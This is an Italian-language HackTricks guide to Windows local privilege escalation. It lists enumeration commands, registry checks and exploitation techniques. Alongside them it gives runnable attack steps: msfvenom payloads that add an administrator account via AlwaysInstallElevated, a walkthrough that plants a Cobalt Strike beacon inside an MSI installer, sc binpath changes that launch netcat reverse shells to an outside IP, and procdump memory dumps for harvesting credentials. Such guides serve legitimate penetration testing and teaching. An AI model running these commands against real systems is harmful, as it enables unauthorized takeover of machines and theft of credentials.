# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Miglior strumento per cercare vettori di escalation dei privilegi locali in Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Teoria Iniziale di Windows

### Token di Accesso

**Se non sai cosa sono i Token di Accesso di Windows, leggi la seguente pagina prima di continuare:**

{{#ref}}
access-tokens.md
{{#endref}}

### ACL - DACL/SACL/ACE

**Controlla la seguente pagina per ulteriori informazioni su ACL - DACL/SACL/ACE:**

{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Livelli di Integrità

**Se non sai cosa sono i livelli di integrità in Windows, dovresti leggere la seguente pagina prima di continuare:**

{{#ref}}
integrity-levels.md
{{#endref}}

## Controlli di Sicurezza di Windows

Ci sono diverse cose in Windows che potrebbero **prevenire l'enumerazione del sistema**, eseguire eseguibili o persino **rilevare le tue attività**. Dovresti **leggere** la seguente **pagina** e **enumerare** tutti questi **meccanismi** di **difesa** prima di iniziare l'enumerazione dell'escalation dei privilegi:

{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## Informazioni di Sistema

### Enumerazione delle informazioni sulla versione

Controlla se la versione di Windows ha vulnerabilità note (controlla anche le patch applicate).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

Questo [sito](https://msrc.microsoft.com/update-guide/vulnerability) è utile per cercare informazioni dettagliate sulle vulnerabilità di sicurezza di Microsoft. Questo database ha più di 4.700 vulnerabilità di sicurezza, mostrando la **massiccia superficie di attacco** che un ambiente Windows presenta.

**Sul sistema**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ha watson integrato)_

**Localmente con informazioni di sistema**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Repo Github di exploit:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

Qualsiasi informazione di credenziali/juicy salvata nelle variabili di ambiente?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Cronologia di PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### File di trascrizione PowerShell

Puoi imparare come attivarlo in [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

I dettagli delle esecuzioni della pipeline di PowerShell vengono registrati, comprendendo i comandi eseguiti, le invocazioni dei comandi e parti degli script. Tuttavia, i dettagli completi dell'esecuzione e i risultati dell'output potrebbero non essere catturati.

Per abilitare questo, segui le istruzioni nella sezione "Transcript files" della documentazione, scegliendo **"Module Logging"** invece di **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Per visualizzare gli ultimi 15 eventi dai log di PowersShell puoi eseguire:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Viene catturato un registro completo delle attività e del contenuto dell'esecuzione dello script, garantendo che ogni blocco di codice sia documentato mentre viene eseguito. Questo processo preserva una traccia di audit completa di ogni attività, preziosa per la forense e l'analisi del comportamento malevolo. Documentando tutte le attività al momento dell'esecuzione, vengono forniti approfondimenti dettagliati sul processo.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Gli eventi di registrazione per il Script Block possono essere trovati all'interno del Visualizzatore eventi di Windows al percorso: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Per visualizzare gli ultimi 20 eventi puoi usare:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Impostazioni Internet
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Unità
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Puoi compromettere il sistema se gli aggiornamenti non vengono richiesti utilizzando http**S** ma http.

Inizi controllando se la rete utilizza un aggiornamento WSUS non SSL eseguendo il seguente:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Se ricevi una risposta come:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
E se `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` è uguale a `1`.

Allora, **è sfruttabile.** Se l'ultimo registro è uguale a 0, l'entry WSUS sarà ignorata.

Per sfruttare queste vulnerabilità puoi usare strumenti come: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - Questi sono script di exploit MiTM armati per iniettare aggiornamenti 'falsi' nel traffico WSUS non SSL.

Leggi la ricerca qui:

{% file src="../../images/CTX_WSUSpect_White_Paper (1).pdf" %}

**WSUS CVE-2020-1013**

[**Leggi il rapporto completo qui**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Fondamentalmente, questo è il difetto che questo bug sfrutta:

> Se abbiamo il potere di modificare il nostro proxy utente locale, e Windows Updates utilizza il proxy configurato nelle impostazioni di Internet Explorer, quindi abbiamo il potere di eseguire [PyWSUS](https://github.com/GoSecure/pywsus) localmente per intercettare il nostro stesso traffico ed eseguire codice come utente elevato sul nostro asset.
>
> Inoltre, poiché il servizio WSUS utilizza le impostazioni dell'utente corrente, utilizzerà anche il suo archivio certificati. Se generiamo un certificato autofirmato per il nome host WSUS e aggiungiamo questo certificato nell'archivio certificati dell'utente corrente, saremo in grado di intercettare sia il traffico WSUS HTTP che HTTPS. WSUS non utilizza meccanismi simili a HSTS per implementare una validazione di tipo trust-on-first-use sul certificato. Se il certificato presentato è fidato dall'utente e ha il nome host corretto, sarà accettato dal servizio.

Puoi sfruttare questa vulnerabilità utilizzando lo strumento [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (una volta che sarà liberato).

## KrbRelayUp

Una vulnerabilità di **elevazione dei privilegi locali** esiste negli ambienti **dominio** di Windows sotto specifiche condizioni. Queste condizioni includono ambienti in cui **la firma LDAP non è applicata,** gli utenti possiedono diritti di auto-configurazione che consentono loro di configurare **Delegazione Constrainata Basata su Risorse (RBCD),** e la capacità per gli utenti di creare computer all'interno del dominio. È importante notare che questi **requisiti** sono soddisfatti utilizzando **impostazioni predefinite**.

Trova l'**exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Per ulteriori informazioni sul flusso dell'attacco controlla [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Se** questi 2 registri sono **abilitati** (il valore è **0x1**), allora gli utenti di qualsiasi privilegio possono **installare** (eseguire) file `*.msi` come NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Payload di Metasploit
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Se hai una sessione meterpreter, puoi automatizzare questa tecnica utilizzando il modulo **`exploit/windows/local/always_install_elevated`**

### PowerUP

Usa il comando `Write-UserAddMSI` da power-up per creare all'interno della directory corrente un binario MSI di Windows per elevare i privilegi. Questo script scrive un installer MSI precompilato che richiede l'aggiunta di un utente/gruppo (quindi avrai bisogno di accesso GIU):
```
Write-UserAddMSI
```
Esegui semplicemente il file binario creato per elevare i privilegi.

### MSI Wrapper

Leggi questo tutorial per imparare a creare un wrapper MSI utilizzando questi strumenti. Nota che puoi avvolgere un "**.bat**" se vuoi **solo** **eseguire** **comandi**

{{#ref}}
msi-wrapper.md
{{#endref}}

### Crea MSI con WIX

{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Crea MSI con Visual Studio

- **Genera** con Cobalt Strike o Metasploit un **nuovo payload TCP EXE Windows** in `C:\privesc\beacon.exe`
- Apri **Visual Studio**, seleziona **Crea un nuovo progetto** e digita "installer" nella casella di ricerca. Seleziona il progetto **Setup Wizard** e clicca su **Avanti**.
- Dai un nome al progetto, come **AlwaysPrivesc**, usa **`C:\privesc`** per la posizione, seleziona **metti soluzione e progetto nella stessa directory**, e clicca su **Crea**.
- Continua a cliccare su **Avanti** fino a raggiungere il passo 3 di 4 (scegli i file da includere). Clicca su **Aggiungi** e seleziona il payload Beacon che hai appena generato. Poi clicca su **Fine**.
- Evidenzia il progetto **AlwaysPrivesc** nell'**Esplora Soluzioni** e nelle **Proprietà**, cambia **TargetPlatform** da **x86** a **x64**.
- Ci sono altre proprietà che puoi cambiare, come **Autore** e **Produttore** che possono far sembrare l'app installata più legittima.
- Fai clic destro sul progetto e seleziona **Visualizza > Azioni personalizzate**.
- Fai clic destro su **Installa** e seleziona **Aggiungi azione personalizzata**.
- Fai doppio clic su **Cartella dell'applicazione**, seleziona il tuo file **beacon.exe** e clicca su **OK**. Questo garantirà che il payload beacon venga eseguito non appena l'installer viene avviato.
- Sotto le **Proprietà dell'azione personalizzata**, cambia **Run64Bit** in **True**.
- Infine, **compilalo**.
- Se viene mostrato l'avviso `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, assicurati di impostare la piattaforma su x64.

### Installazione MSI

Per eseguire l'**installazione** del file `.msi` malevolo in **background:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Per sfruttare questa vulnerabilità puoi usare: _exploit/windows/local/always_install_elevated_

## Antivirus e Rilevatori

### Impostazioni di Audit

Queste impostazioni decidono cosa viene **registrato**, quindi dovresti prestare attenzione.
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, è interessante sapere dove vengono inviati i log
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** è progettato per la **gestione delle password degli amministratori locali**, garantendo che ogni password sia **unica, casuale e regolarmente aggiornata** sui computer collegati a un dominio. Queste password sono memorizzate in modo sicuro all'interno di Active Directory e possono essere accessibili solo dagli utenti a cui sono stati concessi permessi sufficienti tramite ACL, consentendo loro di visualizzare le password degli amministratori locali se autorizzati.

{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Se attivo, **le password in chiaro sono memorizzate in LSASS** (Local Security Authority Subsystem Service).\
[**Ulteriori informazioni su WDigest in questa pagina**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### Protezione LSA

A partire da **Windows 8.1**, Microsoft ha introdotto una protezione avanzata per l'Autorità di Sicurezza Locale (LSA) per **bloccare** i tentativi da parte di processi non attendibili di **leggere la sua memoria** o iniettare codice, aumentando ulteriormente la sicurezza del sistema.\
[**Ulteriori informazioni sulla protezione LSA qui**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** è stato introdotto in **Windows 10**. Il suo scopo è proteggere le credenziali memorizzate su un dispositivo contro minacce come gli attacchi pass-the-hash.| [**Ulteriori informazioni su Credentials Guard qui.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Credenziali Memorizzate

Le **credenziali di dominio** sono autenticate dall'**Autorità di Sicurezza Locale** (LSA) e utilizzate dai componenti del sistema operativo. Quando i dati di accesso di un utente vengono autenticati da un pacchetto di sicurezza registrato, le credenziali di dominio per l'utente vengono tipicamente stabilite.\
[**Ulteriori informazioni sulle Credenziali Memorizzate qui**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Utenti e Gruppi

### Enumerare Utenti e Gruppi

Dovresti controllare se uno dei gruppi a cui appartieni ha permessi interessanti.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Gruppi privilegiati

Se **appartieni a un gruppo privilegiato, potresti essere in grado di elevare i privilegi**. Scopri di più sui gruppi privilegiati e su come abusarne per elevare i privilegi qui:

{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipolazione dei token

**Scopri di più** su cosa sia un **token** in questa pagina: [**Windows Tokens**](../authentication-credentials-uac-and-efs/#access-tokens).\
Controlla la pagina seguente per **scoprire token interessanti** e come abusarne:

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Utenti connessi / Sessioni
```bash
qwinsta
klist sessions
```
### Cartelle home
```powershell
dir C:\Users
Get-ChildItem C:\Users
```
### Politica delle Password
```bash
net accounts
```
### Ottieni il contenuto degli appunti
```bash
powershell -command "Get-Clipboard"
```
## Esecuzione dei Processi

### Permessi di File e Cartelle

Prima di tutto, elencare i processi **controlla se ci sono password all'interno della riga di comando del processo**.\
Controlla se puoi **sovrascrivere qualche binario in esecuzione** o se hai permessi di scrittura nella cartella del binario per sfruttare possibili [**attacchi di DLL Hijacking**](dll-hijacking/):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Controlla sempre la presenza di possibili [**debugger electron/cef/chromium** in esecuzione, potresti abusarne per elevare i privilegi](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Controllo dei permessi dei binari dei processi**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Controllo dei permessi delle cartelle dei binari dei processi (**[**DLL Hijacking**](dll-hijacking/)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Estrazione password dalla memoria

Puoi creare un dump della memoria di un processo in esecuzione utilizzando **procdump** di sysinternals. Servizi come FTP hanno le **credenziali in chiaro nella memoria**, prova a eseguire il dump della memoria e a leggere le credenziali.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Applicazioni GUI insicure

**Le applicazioni che girano come SYSTEM possono consentire a un utente di avviare un CMD o navigare tra le directory.**

Esempio: "Windows Help and Support" (Windows + F1), cerca "command prompt", clicca su "Click to open Command Prompt"

## Servizi

Ottieni un elenco di servizi:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Permessi

Puoi usare **sc** per ottenere informazioni su un servizio
```bash
sc qc <service_name>
```
Si consiglia di avere il binario **accesschk** di _Sysinternals_ per controllare il livello di privilegio richiesto per ciascun servizio.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Si consiglia di verificare se "Utenti autenticati" possono modificare qualche servizio:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Puoi scaricare accesschk.exe per XP qui](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Abilita il servizio

Se ricevi questo errore (ad esempio con SSDPSRV):

_Errore di sistema 1058 si è verificato._\
&#xNAN;_&#x54;il servizio non può essere avviato, o perché è disabilitato o perché non ha dispositivi abilitati associati ad esso._

Puoi abilitarlo usando
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Tieni presente che il servizio upnphost dipende da SSDPSRV per funzionare (per XP SP1)**

**Un'altra soluzione alternativa** a questo problema è eseguire:
```
sc.exe config usosvc start= auto
```
### **Modifica del percorso del binario del servizio**

Nello scenario in cui il gruppo "Utenti autenticati" possiede **SERVICE_ALL_ACCESS** su un servizio, è possibile modificare il binario eseguibile del servizio. Per modificare ed eseguire **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Riavvia il servizio
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
I privilegi possono essere elevati attraverso vari permessi:

- **SERVICE_CHANGE_CONFIG**: Consente la riconfigurazione del binario del servizio.
- **WRITE_DAC**: Abilita la riconfigurazione dei permessi, portando alla possibilità di modificare le configurazioni del servizio.
- **WRITE_OWNER**: Permette l'acquisizione della proprietà e la riconfigurazione dei permessi.
- **GENERIC_WRITE**: Eredita anche la capacità di modificare le configurazioni del servizio.
- **GENERIC_ALL**: Eredita anch'essa la capacità di modificare le configurazioni del servizio.

Per la rilevazione e lo sfruttamento di questa vulnerabilità, si può utilizzare _exploit/windows/local/service_permissions_.

### Permessi deboli dei binari dei servizi

**Controlla se puoi modificare il binario eseguito da un servizio** o se hai **permessi di scrittura sulla cartella** in cui si trova il binario ([**DLL Hijacking**](dll-hijacking/))**.**\
Puoi ottenere ogni binario eseguito da un servizio utilizzando **wmic** (non in system32) e controllare i tuoi permessi usando **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Puoi anche usare **sc** e **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Modifica delle autorizzazioni del registro dei servizi

Dovresti controllare se puoi modificare qualche registro di servizio.\
Puoi **controllare** le tue **autorizzazioni** su un **registro** di servizio eseguendo:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
È necessario verificare se **Authenticated Users** o **NT AUTHORITY\INTERACTIVE** possiedono i permessi `FullControl`. In tal caso, il binario eseguito dal servizio può essere modificato.

Per cambiare il percorso del binario eseguito:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Permessi AppendData/AddSubdirectory del registro dei servizi

Se hai questo permesso su un registro, significa che **puoi creare sotto registri da questo**. Nel caso dei servizi Windows, questo è **sufficiente per eseguire codice arbitrario:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Percorsi di Servizio Non Citati

Se il percorso a un eseguibile non è racchiuso tra virgolette, Windows cercherà di eseguire ogni parte che precede uno spazio.

Ad esempio, per il percorso _C:\Program Files\Some Folder\Service.exe_, Windows cercherà di eseguire:
```powershell
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Elenca tutti i percorsi di servizio non citati, escludendo quelli appartenenti ai servizi Windows integrati:
```powershell
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```powershell
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```powershell
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Puoi rilevare ed esploitare** questa vulnerabilità con metasploit: `exploit/windows/local/trusted\_service\_path` Puoi creare manualmente un binario di servizio con metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Azioni di Recupero

Windows consente agli utenti di specificare azioni da intraprendere se un servizio fallisce. Questa funzionalità può essere configurata per puntare a un binario. Se questo binario è sostituibile, potrebbe essere possibile un'escalation dei privilegi. Maggiori dettagli possono essere trovati nella [documentazione ufficiale](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Applicazioni

### Applicazioni Installate

Controlla **i permessi dei binari** (forse puoi sovrascriverne uno e ottenere privilegi elevati) e delle **cartelle** ([DLL Hijacking](dll-hijacking/)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Permessi di Scrittura

Controlla se puoi modificare qualche file di configurazione per leggere qualche file speciale o se puoi modificare qualche binario che verrà eseguito da un account Amministratore (schedtasks).

Un modo per trovare permessi deboli su cartelle/file nel sistema è fare:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Esegui all'avvio

**Controlla se puoi sovrascrivere qualche registro o binario che verrà eseguito da un utente diverso.**\
**Leggi** la **seguente pagina** per saperne di più su interessanti **posizioni di autorun per escalare i privilegi**:

{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Driver

Cerca possibili driver **di terze parti strani/vulnerabili**.
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
## PATH DLL Hijacking

Se hai **permessi di scrittura all'interno di una cartella presente nel PATH** potresti essere in grado di dirottare un DLL caricata da un processo e **escalare i privilegi**.

Controlla i permessi di tutte le cartelle all'interno del PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Per ulteriori informazioni su come abusare di questo controllo:

{{#ref}}
dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

## Rete

### Condivisioni
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Controlla altri computer noti hardcoded nel file hosts
```
type C:\Windows\System32\drivers\etc\hosts
```
### Interfacce di rete e DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Porte Aperte

Controlla i **servizi riservati** dall'esterno
```bash
netstat -ano #Opened ports?
```
### Tabella di Routing
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Tabella ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Regole del Firewall

[**Controlla questa pagina per i comandi relativi al Firewall**](../basic-cmd-for-pentesters.md#firewall) **(elenca regole, crea regole, disattiva, disattiva...)**

Altri[ comandi per l'enumerazione della rete qui](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Il binario `bash.exe` può essere trovato anche in `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Se ottieni l'utente root, puoi ascoltare su qualsiasi porta (la prima volta che usi `nc.exe` per ascoltare su una porta, verrà chiesto tramite GUI se `nc` dovrebbe essere consentito dal firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
